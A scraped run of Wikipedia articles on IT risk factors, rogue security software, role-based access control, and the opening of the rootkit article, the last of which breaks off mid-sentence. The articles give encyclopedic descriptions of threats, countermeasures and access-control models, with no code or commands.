Environmental, further subdivided in:

Internal environmental factors are, to a large extent, under the control of the enterprise, although they may not always be easy to change.


External environmental factors are, to a large extent, outside the control of the enterprise.


Capability of the organization, further subdivided in:

IT risk management
 capabilities—To what extent is the enterprise mature in performing the risk management processes defined in the 
Risk IT
 framework


IT capabilities—How good is the enterprise at performing the IT processes defined in 
COBIT


IT-related business capabilities (or value management)—How closely do the enterprise's value management activities align with those expressed in the 
Val IT
 processes


Risk scenario
[
edit
]


An 
IT risk
 
risk scenario
 is a description of an IT related event that can lead to a business impact, when and if it should occur.

Risk factors can also be interpreted as causal factors of the scenario that is materialising, or as 
vulnerabilities
 or weaknesses. These are terms often used in risk management frameworks.
[
1
]


Risk scenario
 is characterized by:
[
1
]




A 
threat
 actor that can be:

Internal to the organization (employee, contractor)


External to the organization (competitor, business partner, regulator, act of god)


A threat type:

Malicious,


Accidental


Failure


Natural


Event

Disclosure


Modification


Theft


Destruction


Bad design


Ineffective execution


Inappropriate use


Asset
 or resource

People and organization


Process


Infrastructure or facilities


IT infrastructure


Information


Application


Time

Duration


Timing of occurrence (critical or not)


Timing to detect


Timing to react


The risk scenario structure differentiates between loss events (events generating the negative impact), vulnerabilities or vulnerability events (events contributing to the magnitude or frequency of loss events occurring), and threat events (circumstances or events that can trigger loss events). It is important not to confuse these risks or throw them into one large risk list.
[
2
]




See also
[
edit
]


Asset


Attack (computing)


Countermeasure (computer)


Computer security


Computer insecurity


Information Security


Information security management


ISACA


Information security management system


ISO/IEC 27001


IT risk


Risk


Risk Management


The Open Group


Threat (computer)


Security control


Security risk


Security service (telecommunication)


Vulnerability (computing)


References
[
edit
]






^ 
a
 
b
 
c
 
ISACA THE RISK IT FRAMEWORK (registration required)




^
 
"An Introduction to Factor Analysis of Information Risk (FAIR)", Risk Management Insight LLC, November 2006
 
Archived
 2014-11-18 at the 
Wayback Machine
;














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Risk_factor_(computing)&oldid=1234956101
"


Categories
: 
Computer security
Risk analysis
Hidden category: 
Webarchive template wayback links











From Wikipedia, the free encyclopedia






Form of malicious software


Rogue security software
 is a form of 
malicious software
 and 
internet fraud
 that misleads users into believing there is a 
virus
 on their computer and aims to convince them to pay for a fake 
malware
 removal tool that actually installs malware on their computer.
[
1
]
 It is a form of 
scareware
 that manipulates users through fear, and a form of 
ransomware
.
[
2
]
 Rogue security software has been a serious security threat in desktop computing since 2008.
[
3
]
 An early example that gained infamy was 
SpySheriff
 and its clones,
[
a
]
 such as Nava Shield.

With the rise of cyber-criminals and a black market with thousands of organizations and individuals trading exploits, malware, virtual assets, and credentials, rogue security software has become one of the most lucrative criminal operations.





Propagation
[
edit
]


Rogue security software mainly relies on 
social engineering
 (
fraud
) to defeat the 
security
 built into modern 
operating system
 and 
browser software
 and install itself onto victims' computers.
[
3
]
  A website may, for example, display a fictitious warning dialog stating that someone's machine is infected with a 
computer virus
, and encourage them through 
manipulation
 to install or purchase 
scareware
 in the belief that they are purchasing genuine 
antivirus software
.

Most have a 
Trojan horse
 component, which users are misled into installing.  The Trojan may be disguised as:



A browser 
plug-in
 or extension (typically toolbar)


An image, screensaver or 
archive file
 attached to an 
e-mail
 message


Multimedia 
codec
 required to play a certain 
video clip


Software shared on 
peer-to-peer
 networks
[
4
]


A free online malware-scanning service
[
5
]


Some rogue security software, however, propagate onto users' computers as 
drive-by downloads
 which exploit 
security vulnerabilities
 in web browsers, PDF viewers, or email clients to install themselves without any manual interaction.
[
4
]
[
6
]


More recently, malware distributors have been utilizing 
SEO poisoning
 techniques by pushing infected 
URLs
 to the top of search engine results about recent news events. People looking for articles on such events on a search engine may encounter results that, upon being clicked, are instead redirected through a series of sites
[
7
]
 before arriving at a landing page that says that their machine is infected and pushes a download to a "trial" of the rogue program.
[
8
]
[
9
]
  A 2010 study by 
Google
 found 11,000 domains hosting fake anti-virus software, accounting for 50% of all malware delivered via internet advertising.
[
10
]


Cold-calling
 has also become a vector for distribution of this type of malware, with callers often claiming to be from "Microsoft Support" or another legitimate organization.
[
11
]




Common infection vectors
[
edit
]


Black Hat SEO
[
edit
]


Black Hat 
search engine optimization
 (SEO) is a technique used to trick search engines into displaying malicious 
URLs
 in search results. The malicious webpages are filled with popular keywords in order to achieve a higher ranking in the search results. When the end user searches the web, one of these infected webpages is returned. Usually the most popular keywords from services such as 
Google Trends
 are used to generate webpages via PHP scripts placed on the compromised website. These 
PHP
 scripts will then monitor for search engine crawlers and feed them with specially crafted webpages that are then listed in the search results. Then, when the user searches for their keyword or images and clicks on the malicious link, they will be redirected to the Rogue security software payload.
[
12
]
[
13
]




Malvertising
[
edit
]


Most websites usually employ third-party services for advertising on their webpages. If one of these advertising services is compromised, they may end up inadvertently infecting all of the websites using their service by advertising rogue security software.
[
13
]




Spam campaigns
[
edit
]


Spam
 messages that include malicious attachments, links to binaries and drive-by download sites are another common mechanism for distributing rogue security software. Spam emails are often sent with content associated with typical day-to-day activities such as parcel deliveries, or taxation documents, designed to entice users to click on links or run attachments. When users succumb to these kinds of social engineering tricks they are quickly infected either directly via the attachment, or indirectly via a malicious website. This is known as a drive-by download. Usually in drive-by download attacks the malware is installed on the victim's machine without any interaction or awareness and occurs simply by visiting the website.
[
13
]




Operation
[
edit
]


Once installed, the rogue security software may then attempt to entice the user into purchasing a service or additional software by:



Alerting the user with the fake or simulated detection of malware or 
pornography
.
[
14
]


Displaying an animation simulating a system crash and reboot.
[
3
]


Selectively disabling parts of the system to prevent the user from uninstalling the malware.  Some may also prevent anti-malware programs from running, disable automatic 
system software
 updates and block access to websites of anti-malware vendors.


Installing actual malware onto the computer, then alerting the user after "detecting" them.  This method is less common as the malware is likely to be detected by legitimate 
anti-malware programs
.


Altering system registries and security settings, then "alerting" the user.


Developers of rogue security software may also entice people into purchasing their product by claiming to give a portion of their sales to a charitable cause. The rogue Green antivirus, for example, claims to donate $2 to an environmental care program for each sale made.

Some rogue security software overlaps in function with 
scareware
 by also:



Presenting offers to fix urgent performance problems or perform essential maintenance on the computer.
[
14
]


Scaring the user by presenting authentic-looking pop-up warnings and security alerts, which may mimic actual system notices.
[
15
]
  These are intended to use the trust that the user has in vendors of legitimate security software.
[
3
]


Sanction by the FTC and the increasing effectiveness of anti-malware tools since 2006 have made it difficult for 
spyware
 and 
adware
 distribution networks—already complex to begin with
[
16
]
—to operate profitably.
[
17
]
  Malware vendors have turned instead to the simpler, more profitable 
business model
 of rogue security software, which is targeted directly at users of 
desktop computers
.
[
18
]


Rogue security software is often distributed through highly lucrative 
affiliate networks
, in which affiliates supplied with Trojan kits for the software are paid a fee for every successful installation, and a commission from any resulting purchases.  The affiliates then become responsible for setting up infection vectors and distribution infrastructure for the software.
[
19
]
  An investigation by security researchers into the Antivirus XP 2008 rogue security software found just such an affiliate network, in which members were grossing commissions upwards of $
USD
150,000 over 10 days, from tens of thousands of successful installations.
[
20
]


Despite its use of old-fashioned and somewhat unsophisticated techniques, rogue security software has become a significant security threat, due to the size of the impacted populations, the number of different variants that have been unleashed (over 250), and the profits that have been made for 
cyber-criminals
 (over $300,000 a month).
[
21
]




Countermeasures
[
edit
]


Private efforts
[
edit
]


Law enforcement and legislation in all countries are slow to react to the appearance of rogue security software. In contrast, several private initiatives providing discussion forums and lists of dangerous products were founded soon after the appearance of the first rogue security software. Some reputable vendors, such as Kaspersky,
[
22
]
 also began to provide lists of rogue security software. In 2005, the Anti-Spyware Coalition was founded, a coalition of anti-spyware software companies, academics, and consumer groups.

Many of the private initiatives were initially informal discussions on general 
Internet forums
, but some were started or even entirely carried out by individual people. The perhaps most famous and extensive one is the Spyware Warrior list of rogue/suspect antispyware products and websites by Eric Howes,
[
23
]
 which has however not been updated since May 2007. The website recommends checking the following websites for new rogue anti-spyware programs, most of which are not really new and are "simply re-branded clones and knockoffs of the same rogue applications that have been around for years."
[
24
]




Government efforts
[
edit
]


In December 2008, the 
US District Court for Maryland
—at the request of the 
FTC
—issued a 
restraining order
 against Innovative Marketing Inc, a 
Kyiv
-based firm producing and marketing the rogue security software products 
WinFixer
, 
WinAntivirus
, 
DriveCleaner
, 
ErrorSafe
, and 
XP Antivirus
.
[
25
]
  The company and its US-based web host, ByteHosting Internet Hosting Services LLC, had their assets frozen, were barred from using 
domain names
 associated with those products and any further advertisement or false representation.
[
26
]


Law enforcement has also exerted pressure on banks to shut down merchant gateways involved in processing rogue security software purchases.  In some cases, the high volume of 
credit card
 
chargebacks
 generated by such purchases has also prompted processors to take action against rogue security software vendors.
[
27
]




See also
[
edit
]


Anti-virus


Privacy


Scareware


Technical support scam


Winwebsec


Notes
[
edit
]






^
 
The clones of SpySheriff are BraveSentry, Pest Trap, SpyTrooper, Adware Sheriff, SpywareNo, SpyLocked, SpywareQuake, SpyDawn, AntiVirGear, SpyDemolisher, System Security, SpywareStrike, SpyShredder, Alpha Cleaner, SpyMarshal, Adware Alert, Malware Stopper, Mr. Antispy, Spycrush, SpyAxe, MalwareAlarm, VirusBurst, VirusBursters, DIARemover, AntiVirus Gold, Antivirus Golden, SpyFalcon, and TheSpyBot/SpywareBot.






References
[
edit
]






^
 
"Rogue Security Software » BUMC Information Technology | Boston University"
. 
www.bumc.bu.edu
. Retrieved 
2021-11-13
.




^
 
"Symantec Report on Rogue Security Software"
 
(PDF)
. Symantec. 2009-10-28. Archived from 
the original
 
(PDF)
 on 2012-05-15
. Retrieved 
2010-04-15
.




^ 
a
 
b
 
c
 
d
 
"Microsoft Security Intelligence Report volume 6 (July - December 2008)"
. 
Microsoft
. 2009-04-08. p. 92
. Retrieved 
2009-05-02
.




^ 
a
 
b
 
Doshi, Nishant (2009-01-19), 
Misleading Applications – Show Me The Money!
, 
Symantec
, retrieved 
2016-03-22




^
 
Doshi, Nishant (2009-01-21), 
Misleading Applications – Show Me The Money! (Part 2)
, 
Symantec
, retrieved 
2016-03-22




^
 
"News Adobe Reader and Acrobat Vulnerability"
. blogs.adobe.com
. Retrieved 
25 November
 2010
.




^
 


Chu, Kian; Hong, Choon (2009-09-30), 
Samoa Earthquake News Leads To Rogue AV
, 
F-Secure
, retrieved 
2010-01-16




^
 
Hines, Matthew (2009-10-08), 
Malware Distributors Mastering News SEO
, 
eWeek
, archived from 
the original
 on 2009-12-21
, retrieved 
2010-01-16




^
 
Raywood, Dan (2010-01-15), 
Rogue anti-virus prevalent on links that relate to Haiti earthquake, as donors encouraged to look carefully for genuine sites
, SC Magazine
, retrieved 
2010-01-16




^
 
Moheeb Abu Rajab and Luca Ballard (2010-04-13). 
"The Nocebo Effect on the Web: An Analysis of Fake Anti-Virus Distribution"
 
(PDF)
. Retrieved 
2010-11-18
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
"Warning over anti-virus cold-calls to UK internet users"
. 
BBC News
. 2010-11-15
. Retrieved 
7 March
 2012
.




^
 
"Sophos Technical Papers - Sophos SEO Insights"
. 
sophos.com
.




^ 
a
 
b
 
c
 
"Sophos Fake Antivirus Journey from Trojan tpna"
 
(PDF)
.




^ 
a
 
b
 
"Free Security Scan" Could Cost Time and Money
, 
Federal Trade Commission
, 2008-12-10
, retrieved 
2009-05-02




^
 
"SAP at a crossroads after losing $1.3B verdict"
. 
Yahoo! News
. 24 November 2010
. Retrieved 
25 November
 2010
.




^
 
Testimony of Ari Schwartz on "Spyware"
 
(PDF)
, 
Senate Committee on Commerce, Science, and Transportation
, 2005-05-11




^
 
Leyden, John (2009-04-11). 
"Zango goes titsup: End of desktop adware market"
. 
The Register
. Retrieved 
2009-05-05
.




^
 
Cole, Dave (2006-07-03), 
Deceptonomics: A Glance at The Misleading Application Business Model
, 
Symantec
, retrieved 
2016-03-22




^
 
Doshi, Nishant (2009-01-27), 
Misleading Applications – Show Me The Money! (Part 3)
, 
Symantec
, retrieved 
2016-03-22




^
 
Stewart, Joe. 
"Rogue Antivirus Dissected - Part 2"
. 
Secureworks.com
. SecureWorks
. Retrieved 
9 March
 2016
.




^
 
Cova, Marco; Leita, Corrado; Thonnard, Olivier; Keromytis, Angelos; Dacier, Marc (2009). 
Gone Rogue: An Analysis of Rogue Security Software Campaigns
. pp. 1–3. 
doi
:
10.1109/EC2ND.2009.8
. 
ISBN
 
978-1-4244-6049-6
. Retrieved 
2024-02-09
.




^
 
"Safety 101"
. 
support.kaspersky.com
. Retrieved 
11 November
 2018
.




^
 
"Spyware Warrior: Rogue/Suspect Anti-Spyware Products & Web Sites"
. 
spywarewarrior.com
.




^
 
"Virus, Spyware, & Malware Removal Guides"
. 
BleepingComputer
.




^
 
Ex Parte Temporary Restraining Order RDB08CV3233
 
(PDF)
, 
United States District Court for the District of Maryland
, 2008-12-03
, retrieved 
2009-05-02




^
 
Lordan, Betsy (2008-12-10), 
Court Halts Bogus Computer Scans
, 
Federal Trade Commission
, retrieved 
2009-05-02




^
 
Krebs, Brian (2009-03-20), 
"Rogue Antivirus Distribution Network Dismantled"
, 
Washington Post
, archived from 
the original
 on July 23, 2012
, retrieved 
2009-05-02






External links
[
edit
]


 Media related to 
Rogue software
 at Wikimedia Commons


v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Rogue_security_software&oldid=1244202921
"


Categories
: 
Rogue security software
Types of malware
Security breaches
Social engineering (security)
Hidden categories: 
CS1 errors: missing periodical
Articles with short description
Short description is different from Wikidata
Commons category link is on Wikidata











From Wikipedia, the free encyclopedia






Approach to restricting system access to authorized users


This article's 
lead section
 
may be too short to adequately 
summarize
 the key points
.
 Please consider expanding the lead to 
provide an accessible overview
 of all important aspects of the article.
 
(
May 2012
)


In computer systems security, 
role-based access control
 (
RBAC
)
[
1
]
[
2
]
 or 
role-based security
[
3
]
 is an approach to restricting system access to authorized users, and to implementing 
mandatory access control
 (MAC) or 
discretionary access control
 (DAC).

Role-based access control is a policy-neutral access control mechanism defined around roles and privileges. The components of RBAC such as role-permissions, user-role and role-role relationships make it simple to perform user assignments. A study by NIST has demonstrated that RBAC addresses many needs of commercial and government organizations.
[
4
]
 RBAC can be used to facilitate administration of security in large organizations with hundreds of users and thousands of permissions. Although RBAC is different from MAC and DAC access control frameworks, it can enforce these policies without any complication.





Design
[
edit
]


Within an organization, 
roles
 are created for various job functions. The permissions to perform certain operations are assigned to specific roles. Since users are not assigned permissions directly, but only acquire them through their role (or roles), management of individual user rights becomes a matter of simply assigning appropriate roles to the user's account; this simplifies common operations, such as adding a user, or changing a user's department.

Three primary rules are defined for RBAC:



Role assignment: A subject can exercise a permission only if the subject has selected or been assigned a role.


Role authorization: A subject's active role must be authorized for the subject. With rule 1 above, this rule ensures that users can take on only roles for which they are authorized.


Permission authorization: A subject can exercise a permission only if the permission is authorized for the subject's active role. With rules 1 and 2, this rule ensures that users can exercise only permissions for which they are authorized.


Additional constraints may be applied as well, and roles can be combined in a 
hierarchy
 where higher-level roles subsume permissions owned by sub-roles.

With the concepts of 
role hierarchy
 and constraints, one can control RBAC to create or simulate 
lattice-based access control
 (LBAC). Thus RBAC can be considered to be a superset of LBAC.

When defining an RBAC model, the following conventions are useful:



S = Subject = A person or automated agent


R = Role = Job function or title which defines an authority level


P = Permissions = An approval of a mode of access to a resource


SE = Session = A mapping involving S, R and/or P


SA = Subject Assignment


PA = Permission Assignment


RH = Partially ordered Role Hierarchy. RH can also be written: ≥ (The notation: x ≥ y means that x inherits the permissions of y.)

A subject can have multiple roles.


A role can have multiple subjects.


A role can have many permissions.


A permission can be assigned to many roles.


An operation can be assigned to many permissions.


A permission can be assigned to many operations.


A constraint places a restrictive rule on the potential inheritance of permissions from opposing roles.  Thus it can be used to achieve appropriate 
separation of duties
. For example, the same person should not be allowed to both create a login account and to authorize the account creation.

Thus, using 
set theory notation
:











P


A


⊆


P


×


R






{\displaystyle PA\subseteq P\times R}




 and is a many to many permission to role assignment relation.










S


A


⊆


S


×


R






{\displaystyle SA\subseteq S\times R}




 and is a many to many subject to role assignment relation.










R


H


⊆


R


×


R






{\displaystyle RH\subseteq R\times R}





A subject may have 
multiple
 simultaneous sessions with/in different roles.
RBAC


Standardized levels
[
edit
]


See also: 
NIST RBAC model


The NIST/ANSI/
INCITS
 RBAC standard (2004) recognizes three levels of RBAC:
[
5
]




core RBAC


hierarchical RBAC, which adds support for inheritance between roles


constrained RBAC, which adds separation of duties


Relation to other models
[
edit
]


RBAC is a flexible access control technology whose flexibility allows it to implement 
DAC
[
6
]
 or 
MAC
.
[
7
]
 DAC with groups (e.g., as implemented in POSIX file systems) can emulate RBAC.
[
8
]
 MAC can simulate RBAC if the role graph is restricted to a tree rather than a 
partially ordered set
.
[
9
]


Prior to the development of RBAC, the 
Bell-LaPadula
 (BLP) model was synonymous with MAC and 
file system permissions
 were synonymous with DAC. These were considered to be the only known models for access control: if a model was not BLP, it was considered to be a DAC model, and vice versa. Research in the late 1990s demonstrated that RBAC falls in neither category.
[
10
]
[
11
]
 Unlike 
context-based access control
 (CBAC), RBAC does not look at the message context (such as a connection's source). RBAC has also been criticized for leading to role explosion,
[
12
]
 a problem in large enterprise systems which require access control of finer granularity than what RBAC can provide as roles are inherently assigned to operations and data types. In resemblance to CBAC, an Entity-Relationship Based Access Control (ERBAC, although the same acronym is also used for modified RBAC systems,
[
13
]
 such as Extended Role-Based Access Control
[
14
]
) system is able to secure instances of data by considering their association to the executing subject.
[
15
]




Comparing to ACL
[
edit
]


Access control lists
 (ACLs) are used in traditional discretionary access-control (DAC) systems to affect low-level data-objects. RBAC differs from ACL in assigning permissions to operations which change the direct-relations between several entities (see: 
ACLg
 below). For example, an ACL could be used for granting or denying write access to a particular system file, but it wouldn't dictate how that file could be changed. In an RBAC-based system, an operation might be to 'create a credit account' transaction in a financial application or to 'populate a blood sugar level test' record in a medical application. A Role is thus a sequence of operations within a larger activity. RBAC has been shown to be particularly well suited to separation of duties (SoD) requirements, which ensure that two or more people must be involved in authorizing critical operations. Necessary and sufficient conditions for safety of SoD in RBAC have been analyzed. An underlying principle of SoD is that no individual should be able to effect a breach of security through dual privilege. By extension, no person may hold a role that exercises audit, control or review authority over another, concurrently held role.
[
16
]
[
17
]


Then again, a "minimal RBAC Model", 
RBACm
, can be compared with an ACL mechanism, 
ACLg
, where only groups are permitted as entries in the ACL. Barkley (1997)
[
18
]
 showed that 
RBACm
 and 
ACLg
 are equivalent.

In modern 
SQL
 implementations, like 
ACL of the
 
CakePHP
 framework, ACLs also manage groups and inheritance in a hierarchy of groups. Under this aspect, specific "modern ACL" implementations can be compared with specific "modern RBAC" implementations, better than "old (file system) implementations".

For data interchange, and for "high level comparisons", ACL data can be translated to 
XACML
.



Attribute-based access control
[
edit
]


Attribute-based access control or 
ABAC
 is a model which evolves from RBAC to consider additional attributes in addition to roles and groups. In ABAC, it is possible to use attributes of:



the user e.g. citizenship, clearance,


the resource e.g. classification, department, owner,


the action, and


the context e.g. time, location, IP.


ABAC is policy-based in the sense that it uses policies rather than static permissions to define what is allowed or what is not allowed.



Relationship-based access control
[
edit
]


Relationship-based access control or 
ReBAC
 is a model which evolves from RBAC. In ReBAC, a subject's permission to access a resource is defined by the presence of relationships between those subjects and resources. 

The advantage of this model is that allows for fine-grained permissions; for example, in a social network where users can share posts with other specific users. 
[
19
]




Use and availability
[
edit
]


The use of RBAC to manage user privileges (computer permissions) within a single system or application is widely accepted as a best practice. A 2010 report prepared for 
NIST
 by the 
Research Triangle Institute
 analyzed the economic value of RBAC for enterprises, and estimated benefits per employee from reduced employee downtime, more efficient provisioning, and more efficient access control policy administration.
[
20
]


In an organization with a heterogeneous 
IT infrastructure
 and requirements that span dozens or hundreds of systems and applications, using RBAC to manage sufficient roles and assign adequate role memberships becomes extremely complex without hierarchical creation of roles and privilege assignments.
[
21
]
 Newer systems extend the older 
NIST RBAC model
[
22
]
 to address the limitations of RBAC for enterprise-wide deployments. The NIST model was adopted as a standard by 
INCITS
 as ANSI/INCITS 359-2004. A discussion of some of the design choices for the NIST model has also been published.
[
23
]




Potential Vulnerabilities
[
edit
]


Role based access control interference is a relatively new issue in security applications, where multiple user accounts with dynamic access levels may lead to encryption key instability, allowing an outside user to exploit the weakness for unauthorized access. Key sharing applications within dynamic virtualized environments have shown some success in addressing this problem.
[
24
]






See also
[
edit
]




Access control list


Attribute-based access control
 (ABAC)


Relationship-based access control
 (ReBAC)


Organisation-based access control
 (OrBAC)


RSBAC


Capability-based security


Risk-based authentication


AGDLP
 (Microsoft's recommendations for implementing RBAC)


Identity driven networking
 (IDN)


PERMIS


Classified information


Apache Fortress


References
[
edit
]






^
 
Ferraiolo, D.F. & Kuhn, D.R. (October 1992). 
"Role-Based Access Control"
 
(PDF)
. 
15th National Computer Security Conference
: 554–563.




^
 
Sandhu, R., Coyne, E.J., Feinstein, H.L. and Youman, C.E. (August 1996). 
"Role-Based Access Control Models"
 
(PDF)
. 
IEEE Computer
. 
29
 (2): 38–47. 
CiteSeerX
 
10.1.1.50.7649
. 
doi
:
10.1109/2.485845
. 
S2CID
 
1958270
.
{{
cite journal
}}
:  CS1 maint: multiple names: authors list (
link
)




^
 
ABREU, VILMAR; Santin, Altair O.; VIEGAS, EDUARDO K.; STIHLER, MAICON (2017). "A multi-domain role activation model". 
2017 IEEE International Conference on Communications (ICC)
 
(PDF)
. IEEE Press. pp. 1–6. 
doi
:
10.1109/ICC.2017.7997247
. 
ISBN
 
978-1-4673-8999-0
. 
S2CID
 
6185138
.




^
 
Gilbert MD, Lynch N, Ferraiolo FD (1995). 
"An examination of federal and commercial access control policy needs"
. 
National Computer Security Conference, 1993 (16th) Proceedings: Information Systems Security: User Choices
. DIANE Publishing. p. 107. 
ISBN
 
9780788119248
.




^
 
Alberto Belussi; Barbara Catania; Eliseo Clementini; Elena Ferrari (2007). 
Spatial Data on the Web: Modeling and Management
. Springer. p. 194. 
ISBN
 
978-3-540-69878-4
.




^
 
Ravi Sandhu; Qamar Munawer (October 1998). "How to do discretionary access control using roles". 
3rd ACM Workshop on Role-Based Access Control
: 47–54.




^
 
Sylvia Osborn; Ravi Sandhu & Qamar Munawer (2000). "Configuring role-based access control to enforce mandatory and discretionary access control policies". 
ACM Transactions on Information and System Security
: 85–106.




^
 
Brucker, Achim D.; Wolff, Burkhart (2005). 
"A Verification Approach for Applied System Security"
. 
International Journal on Software Tools for Technology Transfer
. 
7
 (3): 233–247. 
doi
:
10.1007/s10009-004-0176-3
. 
hdl
:
20.500.11850/52625
. 
S2CID
 
6427232
.




^
 
D.R. Kuhn (1998). "Role based access control on MLS systems without kernel changes". 
Proceedings of the third ACM workshop on Role-based access control
 
(PDF)
. pp. 25–32. 
CiteSeerX
 
10.1.1.55.4755
. 
doi
:
10.1145/286884.286890
. 
ISBN
 
978-1-58113-113-0
. 
S2CID
 
1711956
.




^
 
"Role Based Access Control – FAQs"
. 
csrc.nist.gov
. Computer Security Research Center. 2016-11-21
. Retrieved 
15 August
 2018
.




^
 
Ferraiolo, David; Kuhn, Richard (1992-10-13). 
"Role-Based Access Controls"
 
(PDF)
. 
csrc.nist.gov
: 554–563
. Retrieved 
15 August
 2018
.




^
 
A. A. Elliott & G. S. Knight (2010). 
"Role Explosion: Acknowledging the Problem"
 
(PDF)
. 
Proceedings of the 2010 International Conference on Software Engineering Research & Practice
.




^
 
"ERBAC – Enterprise Role-Based Access Control (computing) – AcronymFinder"
. 
www.acronymfinder.com
. Retrieved 
15 August
 2018
.




^
 
"Dr. Bhavani Thuraisingham and Srinivasan Iyer (PPT)"
. Retrieved 
15 August
 2018
.




^
 
Korhonen, Kalle. 
"tapestry-security-jpa"
. 
www.tynamo.org
. Retrieved 
15 August
 2018
.




^
 
D.R. Kuhn (1997). "Mutual exclusion of roles as a means of implementing separation of duty in role-based access control systems". 
Proceedings of the second ACM workshop on Role-based access control - RBAC '97
 
(PDF)
. pp. 23–30. 
doi
:
10.1145/266741.266749
. 
ISBN
 
0897919858
. 
S2CID
 
482687
.




^
 
Li, Ninghui; Bizri, Ziad; Tripunitara, Mahesh V. (2004). "On mutually-exclusive roles and separation of duty". 
Proceedings of the 11th ACM conference on Computer and communications security
 
(PDF)
. pp. 42–51. 
CiteSeerX
 
10.1.1.159.2556
. 
doi
:
10.1145/1030083.1030091
. 
ISBN
 
978-1581139617
. 
S2CID
 
798546
.




^
 
J. Barkley (1997) "
Comparing simple role based access control models and access control lists
", In "Proceedings of the second ACM workshop on Role-based access control", pages 127-132.




^
 
Gates, Carrie (2007). 
"Access control requirements for web 2.0 security and privacy"
. 
IEEE Web
. 
2
: 12–15.




^
 
A.C. O'Connor & R.J. Loomis (March 2002). 
Economic Analysis of Role-Based Access Control
 
(PDF)
. Research Triangle Institute. p. 145.




^
 
Systems, Hitachi ID. 
"Beyond Roles: A Practical Approach to Enterprise IAM"
. 
www.idsynch.com
. Retrieved 
15 August
 2018
.




^
 
Sandhu, R., Ferraiolo, D.F. and Kuhn, D.R. (July 2000). 
"The NIST model for role-based access control"
 
(PDF)
. 
Proceedings of the fifth ACM workshop on Role-based access control
. pp. 47–63. 
doi
:
10.1145/344287.344301
. 
ISBN
 
158113259X
. 
S2CID
 
14539795
.
{{
cite book
}}
:  CS1 maint: multiple names: authors list (
link
)




^
 
Ferraiolo, D.F., Kuhn, D.R., and Sandhu, R. (Nov–Dec 2007). 
"RBAC Standard Rationale: comments on a Critique of the ANSI Standard on Role-Based Access Control"
 
(PDF)
. 
IEEE Security & Privacy
. 
5
 (6): 51–53. 
doi
:
10.1109/MSP.2007.173
. 
S2CID
 
28140142
. Archived from 
the original
 
(PDF)
 on 2008-09-17.
{{
cite journal
}}
:  CS1 maint: multiple names: authors list (
link
)




^
 
Marikkannu, P (2011). 
"Fault-tolerant adaptive mobile agent system using dynamic role based access control"
. 
International Journal of Computer Applications
. 
20
 (2): 1–6. 
Bibcode
:
2011IJCA...20b...1M
. 
doi
:
10.5120/2409-3208
.






Further reading
[
edit
]


David F. Ferraiolo; D. Richard Kuhn; Ramaswamy Chandramouli (2007). 
Role-based Access Control
 (2nd ed.). Artech House. 
ISBN
 
978-1-59693-113-8
.


External links
[
edit
]


FAQ on RBAC models and standards


Role Based Access Controls at NIST


XACML core and hierarchical role based access control profile


Institute for Cyber Security at the University of Texas San Antonio


Practical experiences in implementing RBAC










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Role-based_access_control&oldid=1226281024
"


Categories
: 
Computer security models
Access control
Hidden categories: 
CS1 maint: multiple names: authors list
Articles with short description
Short description is different from Wikidata
Wikipedia introduction cleanup from May 2012
All pages needing cleanup
Articles covered by WikiProject Wikify from May 2012
All articles covered by WikiProject Wikify











From Wikipedia, the free encyclopedia






Software designed to enable access to unauthorized locations in a computer


A 
rootkit
 is a collection of 
computer software
, typically malicious, designed to enable access to a 
computer
 or an area of its 
software
 that is not otherwise allowed (for example, to an unauthorized user) and often masks its existence or the existence of other software.
[
1
]
 The term 
rootkit
 is a 
compound
  of "
root
" (the traditional name of the privileged account on 
Unix-like
 operating systems) and the word "kit" (which refers to the software components that implement the tool).
[
2
]
 The term "rootkit" has negative connotations through its association with 
malware
.
[
1
]


Rootkit installation can be automated, or an 
attacker
 can install it after having obtained root or administrator access.
[
3
]
 Obtaining this access is a result of direct attack on a system, i.e. exploiting a vulnerability (such as 
privilege escalation
) or a 
password
 (obtained by 
cracking
 or 
social engineering
 tactics like "
phishing
"). Once installed, it becomes possible to hide the intrusion as well as to maintain privileged access. Full control over a system means that existing software can be modified, including software that might otherwise be used to detect or circumvent it.

Rootkit detection is difficult because a rootkit may be able to subvert the software that is intended to find it. Detection methods include using an alternative and trusted 
operating system
, behavior-based methods, signature scanning, difference scanning, and 
memory dump
